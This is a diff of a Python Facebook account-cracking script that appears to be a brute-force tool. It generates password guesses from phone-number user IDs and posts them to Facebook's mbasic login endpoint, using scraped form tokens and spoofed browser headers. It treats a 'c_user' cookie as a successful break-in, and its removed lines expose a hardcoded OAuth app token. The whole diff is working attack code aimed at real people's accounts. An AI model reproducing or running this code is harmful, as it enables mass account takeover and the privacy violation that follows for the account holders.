@@ -227,7 +227,7 @@ def xxr():
         print(f' \033[1;91m[\033[1;97m✅\033[1;91m]\033[38;5;46m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 𝙄𝘿:\033[38;5;46m {xr}'+tl)
         print('\033[38;5;46m══════════════════════════════════')              
         for love in user:
-            pwx = ["last6digit", "last7digit", "last8digit", "last9digit", "last10digit", "fullnumber", "first6digit", "first7digit", "first8digit", "first9digit", "first10digit", "57575751", "59039200"]
+            pwx = [love[1:]]
             uid = code+love
             for Eman in Emran:
                 pwx.append(Eman)
@@ -245,31 +245,38 @@ def rcrack(uid,pwx,tl):
             session = requests.Session()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
-            "adid": str(uuid.uuid4()),
-            "device_id": str(uuid.uuid4()),
-            "email": uid,
-            "password": pww,
-            "cpl": "true",
-            "source": "device_based_login",
-            "format": "json",
-            "generate_session_cookies": "1",
-            "generate_analytic_claims": "1",
-            "generate_machine_id": "1",
-            "locale": "GB",
-            "country_code": "GB",
-            "client_country_code": "GB",
-            "currently_logged_in_userid": "0",
-        }
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+#____((𝑼𝑷𝑫𝑨𝑻𝑬-𝑺𝒀𝑺𝑻𝑬𝑴-𝑩𝑶𝑺𝑺-𝑬𝑴𝑹𝑨𝑵))            
             header_freefb = {
-            "User-Agent": ua,
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
-            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
-            "X-FB-Connection-Quality": "EXCELLENT",
-            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
-            "X-FB-HTTP-Engine": "Liger",
-        }
+            'authority': 'www.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
+            'cache-control': 'max-age=0',
+            'dpr': '2',
+            'referer': 'https://web.facebook.com/',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-ua-platform-version': '""',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-site',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+            'viewport-width': '980',
+}
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
